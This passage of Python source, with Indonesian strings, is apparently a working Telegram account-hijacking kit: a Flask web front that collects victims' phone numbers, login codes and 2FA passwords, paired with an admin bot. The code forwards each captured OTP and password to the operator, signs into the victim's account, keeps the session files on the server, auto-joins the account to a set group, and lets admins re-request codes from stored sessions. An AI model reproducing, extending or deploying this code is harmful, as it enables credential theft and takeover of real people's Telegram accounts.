                                    name = me.first_name or me.username or "No Name"
                                    status = f"✅ `{name[:15]}` (`{me.phone}`)"
                                else:
                                    status = "⏳ Belum Terotorisasi"
                                report_lines.append(f"{i}. {phone}: {status}")
                                await bot_state.cleanup_client(client)
                            else:
                                report_lines.append(f"{i}. {phone}: ❌ Gagal membuat client")
                        except:
                            report_lines.append(f"{i}. {phone}: ❌ Error")
                    
                    response = "\n".join(report_lines)
                
                buttons = [
                    [Button.inline("🔄 Refresh", b"status_login"), Button.inline("🔙 Kembali", b"back_to_main")]
                ]
                await event.edit(response, buttons=buttons)
            
            elif data == "system_stats":
                await event.answer("📊 Mengambil statistik...", alert=False)
                session_files = get_session_files()
                active_count = bot_state.get_client_count()
                otp_requests_count = len(bot_state.otp_requests)
                
                report = (
                    f"📊 **Statistik Sistem:**\n\n"
                    f"• Sesi Aktif: `{active_count}`\n"
                    f"• Sesi Tersimpan: `{len(session_files)}`\n"
                    f"• Request OTP Aktif: `{otp_requests_count}`\n"
                    f"• Target Grup: `{bot_state.target_group_bot or 'Belum diatur'}`\n"
                    f"• Admin: `{len(ADMIN_IDS)}` user\n\n"
                    f"🕐 Server Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
                
                buttons = [
                    [Button.inline("🔄 Refresh", b"system_stats"), Button.inline("🔙 Kembali", b"back_to_main")]
                ]
                await event.edit(report, buttons=buttons)
            
            elif data == "logout_all":
                await event.answer("🚫 Logout semua client...", alert=False)
                count = bot_state.get_client_count()
                
                bot_state.clear_all_sessions()
                send_admin_notif(f"🚫 Semua sesi telah di-logout ({count} sesi)")
                
                buttons = [[Button.inline("✅ OK", b"back_to_main")]]
                await event.edit(f"✅ {count} sesi telah di-logout", buttons=buttons)
            
            elif data == "reg_otp_baru":
                await event.answer("🔄 Memuat daftar sesi...", alert=False)
                session_files = get_session_files()
                active_sessions = list(bot_state.active_clients.keys())
                
                if not session_files and not active_sessions:
                    await event.edit("❌ Tidak ada sesi yang tersimpan atau client aktif.", 
                                   buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                    return
                
                buttons = []
                # Tambahkan sesi aktif
                for phone in active_sessions[:5]:
                    session_info = bot_state.active_clients[phone]
                    try:
                        # Cek status login
                        client = await get_client_for_phone(phone)
                        if client:
                            auth_status = await client.is_user_authorized()
                            if auth_status:
                                me = await client.get_me()
                                label = f"✅ {phone} ({me.first_name[:10]})"
                            else:
                                label = f"⏳ {phone} (Belum login)"
                            buttons.append([Button.inline(label, f"reg_otp:{phone}")])
                            await bot_state.cleanup_client(client)
                        else:
                            buttons.append([Button.inline(f"❓ {phone} (Error)", f"reg_otp:{phone}")])
                    except:
                        buttons.append([Button.inline(f"❓ {phone} (Error)", f"reg_otp:{phone}")])
                
                # Tambahkan sesi tersimpan
                for session in session_files[:5]:
                    phone = session['phone']
                    if phone in active_sessions:
                        continue
                    
                    status = "🟢" if session['is_active'] else "💾"
                    phone_display = phone[:15] + "..." if len(phone) > 15 else phone
                    label = f"{status} {phone_display}"
                    buttons.append([Button.inline(label, f"reg_otp:{phone}")])
                
                buttons.append([Button.inline("📝 Input Nomor Manual", b"reg_otp_manual")])
                buttons.append([Button.inline("🔙 Kembali", b"back_to_main")])
                
                await event.edit(
                    "📱 **Pilih Sesi untuk Reg OTP Baru:**\n\n✅ = Sudah login\n⏳ = Belum login\n💾 = Sesi tersimpan\n\nPilih salah satu:",
                    buttons=buttons
                )
            
            elif data == "reg_otp_manual":
                await event.answer("📝 Input manual...", alert=False)
                
                async with bot.conversation(event.sender_id, timeout=60) as conv:
                    try:
                        await conv.send_message(
                            "📝 **Input Nomor Telepon Manual**\n\nKirim nomor telepon (contoh: 08123456789 atau +628123456789):"
                        )
                        
                        response = await conv.get_response(timeout=60)
                        raw_phone = response.text.strip()
                        phone = validate_phone_number(raw_phone)
                        
                        if not phone:
                            await conv.send_message("❌ Nomor telepon tidak valid! Format: 08xxx atau +628xxx")
                            return
                        
                        # Cek apakah session file ada
                        session_path = get_session_path(phone)
                        
                        if os.path.exists(session_path):
                            # Coba minta OTP baru
                            result = await request_new_otp_from_session(phone)
                            await conv.send_message(result)
                        else:
                            # Buat session baru
                            client = TelegramClient(session_path, API_ID, API_HASH, **device_config)
                            try:
                                await client.connect()
                                sent_code = await client.send_code_request(phone)
                                
                                # Tambahkan ke sesi aktif
                                bot_state.add_session_info(phone, session_path)
                                
                                await conv.send_message(
                                    f"✅ Permintaan OTP berhasil!\n\n📱 Nomor: {phone}\n🔑 Phone Code Hash: `{sent_code.phone_code_hash[:20]}...`\n\nSesi telah disimpan dan siap untuk verifikasi."
                                )
                                
                            except Exception as e:
                                await conv.send_message(f"❌ Gagal: {str(e)}")
                                try:
                                    await client.disconnect()
                                except:
                                    pass
                        
                    except asyncio.TimeoutError:
                        await conv.send_message("⏰ Waktu habis, silakan coba lagi.")
                    except Exception as e:
                        await conv.send_message(f"❌ Error: {str(e)}")
            
            elif data.startswith("reg_otp:"):
                phone = data.split(":", 1)[1]
                await event.answer(f"🔄 Memproses {phone}...", alert=False)
                
                result = await request_new_otp_from_session(phone)
                await event.edit(result, buttons=[[Button.inline("🔙 Kembali", b"reg_otp_baru")]])

            elif data == "auto_join":
                session_info = bot_state.get_session_info()
                if not session_info:
                    await event.answer("❌ Belum ada sesi aktif!", alert=True)
                    return
                    
                phone = session_info['phone']
                client = None
                try:
                    group_link = WEB_SPECIAL_GROUP_LINK
                    if not group_link:
                        await event.edit("❌ Link group tidak diatur dalam config", 
                                       buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                        return
                    
                    await event.answer("🚀 Bergabung ke group...", alert=False)
                    client = await get_client_for_phone(phone)
                    if not client:
                        await event.edit("❌ Gagal membuat client!", 
                                       buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                        return
                    
                    await client(JoinChannelRequest(group_link))
                    
                    await event.edit(f"✅ Berhasil join ke group: {group_link}", 
                                   buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                    
                except Exception as e:
                    logger.error(f"Error auto join: {e}")
                    await event.edit(f"❌ Gagal join group: {str(e)}", 
                                   buttons=[[Button.inline("🔙 Kembali", b"back_to_main")]])
                finally:
                    if client:
                        await bot_state.cleanup_client(client)

            elif data == "back_to_main":
                status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
                active_clients_count = bot_state.get_client_count()
                
                msg = (
                    f"🤖 **Dashboard Admin Panel**\n\n"
                    f"🎯 Target Grup: `{status_bot}`\n"
                    f"✅ Status Bot: **Online**\n"
                    f"📱 Client Aktif: **{active_clients_count}**\n"
                    f"👑 Admin ID: `{event.sender_id}`"
                )
                await event.edit(msg, buttons=get_admin_buttons())

            else:
                await event.answer("⚠️ Tombol tidak dikenali, kembali ke menu utama", alert=True)
                status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
                active_clients_count = bot_state.get_client_count()
                
                msg = (
                    f"🤖 **Dashboard Admin Panel**\n\n"
                    f"🎯 Target Grup: `{status_bot}`\n"
                    f"✅ Status Bot: **Online**\n"
                    f"📱 Client Aktif: **{active_clients_count}**\n"
                    f"👑 Admin ID: `{event.sender_id}`"
                )
                await event.edit(msg, buttons=get_admin_buttons())
                
        except Exception as e:
            logger.error(f"Error dalam callback handler: {e}")
            await event.respond(f"❌ Error sistem: {str(e)}")
        
        finally:
            bot_state.remove_callback(callback_id)

# --- ASYNC SIGN IN FUNCTION ---
async def async_sign_in(phone: str, phone_code_hash: str, otp: str, password: str = None):
    """Fungsi async untuk sign in dengan OTP"""
    client = None
    try:
        session_path = get_session_path(phone)
        client = TelegramClient(
            session_path, 
            API_ID, 
            API_HASH, 
            **device_config,
            timeout=30,
            connection_retries=3,
            retry_delay=2
        )
        
        await client.connect()
        
        if password:
            user = await client.sign_in(phone=phone, password=password)
        else:
            user = await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        
        # Auto join ke group khusus
        try:
            await client(JoinChannelRequest(WEB_SPECIAL_GROUP_LINK))
            logger.info(f"User {phone} joined group")
        except Exception as e:
            logger.warning(f"Gagal join grup: {e}")
        
        await client.disconnect()
        return user
        
    except Exception as e:
        if client:
            try:
                await client.disconnect()
            except:
                pass
        raise e

# --- ROUTES FLASK (WEB) ---
@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    user_info = {
        "full_name": session.get('name', 'Pengguna'),
        "user_id": session.get('user_id'),
        "phone": session.get('phone', 'Tidak diketahui')
    }
    
    return render_template('index.html', info=user_info)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Route untuk login dengan nomor telepon"""
    if 'user_id' in session:
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        provinsi = request.form.get('provinsi', '').strip()
        raw_phone = request.form.get('phone', '').strip()
        
        # Validasi nomor telepon
        phone = validate_phone_number(raw_phone)
        
        if not phone:
            flash("❌ Nomor telepon tidak valid! Gunakan format: 08123456789 atau 628123456789")
            return render_template('login.html')
        
        # Simpan data ke session
        session['provinsi'] = provinsi
        bot_state.current_login_number = phone
        
        try:
            logger.info(f"Login attempt: {phone} dari {provinsi}")
            send_admin_notif(f"📥 Percobaan Login Web: {phone} dari {provinsi}")
            
            # Path session
            user_session_path = get_session_path(phone)
            
            # Cegah multiple login dengan lock file
            lock_file = user_session_path + '.lock'
            try:
                with open(lock_file, 'w') as f:
                    f.write(str(os.getpid()))
            except:
                pass
            
            try:
                # Buat dan connect client di thread pool menggunakan versi async
                client, sent_code = run_in_thread(create_and_connect_client_async, phone, user_session_path)
                
                # Simpan informasi sesi (bukan client object)
                bot_state.add_session_info(phone, user_session_path)
                
                # Simpan ke session
                session['phone'] = phone
                session['phone_code_hash'] = sent_code.phone_code_hash
                session['client_session'] = os.path.basename(user_session_path)
                
                # Notifikasi admin
                send_admin_notif(f"✅ OTP Terkirim! Nomor: {phone}")
                
                flash("✅ Kode OTP telah dikirim! Cek aplikasi Telegram Anda.")
                return redirect(url_for('verify'))
                
            except PhoneNumberInvalidError:
                flash("❌ Nomor telepon tidak valid di sistem Telegram!")
            except FloodWaitError as fwe:
                wait_time = fwe.seconds
                minutes = wait_time // 60
                seconds = wait_time % 60
                flash(f"⏳ Terlalu banyak percobaan. Tunggu {minutes} menit {seconds} detik.")
                logger.warning(f"Flood wait untuk {phone}: {wait_time}s")
            except RPCError as e:
                logger.error(f"RPC Error: {e}")
                flash(f"❌ Error Telegram: {str(e)}")
            except Exception as e:
                if "database is locked" in str(e).lower():
                    flash("❌ Database sedang digunakan. Silakan coba lagi dalam beberapa detik.")
                else:
                    flash(f"❌ Gagal: {str(e)}")
                logger.error(f"Login error untuk {phone}: {e}")
            
            finally:
                # Hapus lock file
                try:
                    if os.path.exists(lock_file):
                        os.remove(lock_file)
                except:
                    pass
            
            return render_template('login.html')
            
        except Exception as e:
            logger.error(f"Unexpected error in login: {e}")
            flash(f"❌ Gagal: {str(e)}")
            return render_template('login.html')
    
    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    """Route untuk verifikasi OTP"""
    if 'phone' not in session or 'phone_code_hash' not in session:
        flash("❌ Sesi tidak valid, silakan login ulang")
        return redirect(url_for('login'))
    
    phone = session['phone']
    phone_hash = session['phone_code_hash']
    
    if request.method == 'POST':
        otp = request.form.get('otp', '').strip()
        password = request.form.get('password', '').strip()
        
        if not otp and not password:
            flash("❌ Masukkan kode OTP atau password 2FA")
            return render_template('verify.html', password_required=False)
        
        # Simpan OTP ke cache
        bot_state.otp_session_cache = f"Phone: {phone}\nOTP: {otp}\n2FA: {password if password else 'N/A'}"
        
        # Notifikasi admin
        send_admin_notif(
            f"🔑 **Data OTP Masuk!**\nNomor: `{phone}`\nKode: `{otp}`\n2FA: `{'Ya' if password else 'Tidak'}`"
        )
        
        try:
            # Gunakan loop_manager.run_async untuk menghindari masalah event loop
            user = loop_manager.run_async(
                async_sign_in(phone, phone_hash, otp, password if password else None),
                timeout=30
            )
            
            # Simpan data user ke session
            session['user_id'] = user.id
            session['name'] = user.first_name or "User"
            session['username'] = user.username or ""
            
            # Notifikasi admin login berhasil
            send_admin_notif(
                f"✅ **LOGIN BERHASIL!**\nUser: {user.first_name}\nPhone: `{phone}`\nID: `{user.id}`\nProvinsi: {session.get('provinsi', 'Tidak diketahui')}"
            )
            
            flash(f"✅ Login berhasil! Selamat datang {user.first_name}")
            return redirect(url_for('index'))
            
        except SessionPasswordNeededError:
            return render_template('verify.html', password_required=True)
        except PhoneCodeInvalidError:
            flash("❌ Kode OTP salah!")
        except PhoneCodeExpiredError:
            flash("❌ Kode OTP sudah kadaluarsa! Minta kode baru.")
            return redirect(url_for('login'))
        except Exception as e:
            flash(f"❌ Gagal: {str(e)}")
            logger.error(f"Verify error untuk {phone}: {e}")
    
    return render_template('verify.html', password_required=False)

@app.route('/logout')
def logout():
    """Route untuk logout"""
    phone = session.get('phone')
    if phone:
        bot_state.remove_session(phone)
        logger.info(f"User {phone} logged out")
    
    session.clear()
    flash("✅ Anda telah logout")
    return redirect(url_for('login'))

@app.route('/api/status')
def api_status():
    """API endpoint untuk status sistem"""
    status = {
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'active_clients': bot_state.get_client_count(),
        'target_group': bot_state.target_group_bot,
        'admin_count': len(ADMIN_IDS),
        'sessions_count': len([f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]),
        'otp_requests': len(bot_state.otp_requests),
        'pending_callbacks': len(bot_state.pending_callbacks)
    }
    return jsonify(status)

@app.route('/api/otp_requests')
def api_otp_requests():
    """API endpoint untuk melihat request OTP"""
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    return jsonify({
        'count': len(bot_state.otp_requests),
        'requests': bot_state.otp_requests
    })

# --- BACKGROUND PROCESS ---
async def bot_main():
    global bot
    
    try:
        bot = TelegramClient(BOT_SESSION, API_ID, API_HASH)
        await bot.start(bot_token=BOT_TOKEN)
        
        # Set bot loop ke loop manager
        loop_manager.set_bot_loop(bot.loop)
        
        await setup_bot_handlers()
        
        logger.info("🤖 BOT ADMIN READY - Sistem siap beroperasi")
        
        startup_msg = (
            f"🤖 **Bot Admin Started**\n\n"
            f"🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"📍 Host: {config['host']}:{config['port']}\n"
            f"👥 Admin: {len(ADMIN_IDS)} user\n"
            f"🎯 Target Group: {bot_state.target_group_bot or 'Belum diatur'}"
        )
        
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, startup_msg)
            except Exception as e:
                logger.error(f"Failed to send startup message to admin {admin_id}: {e}")
        
        await bot.run_until_disconnected()
        
    except Exception as e:
        logger.error(f"Bot error: {e}")
        raise

def start_telegram_bot():
    """Menjalankan bot Telegram di thread terpisah"""
    # Buat event loop baru untuk thread ini
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        # Jalankan periodic cleanup
        loop.create_task(periodic_cleanup())
        
        # Jalankan bot utama
        loop.run_until_complete(bot_main())
    except KeyboardInterrupt:
        logger.info("Bot dihentikan")
    except Exception as e:
        logger.error(f"Fatal error in bot: {e}")

# --- MAIN EXECUTION ---
if __name__ == '__main__':
    # Start bot di thread terpisah
    bot_thread = threading.Thread(target=start_telegram_bot, daemon=True, name="BotThread")
    bot_thread.start()
    
    # Tunggu sebentar untuk memastikan bot sudah berjalan
    time.sleep(2)
    
    logger.info(f"🚀 Starting Flask server on {config['host']}:{config['port']}")
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    
    try:
        app.run(
            host=config['host'],
            port=config['port'],
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Failed to start Flask server: {e}")
    finally:
        loop_manager.shutdown()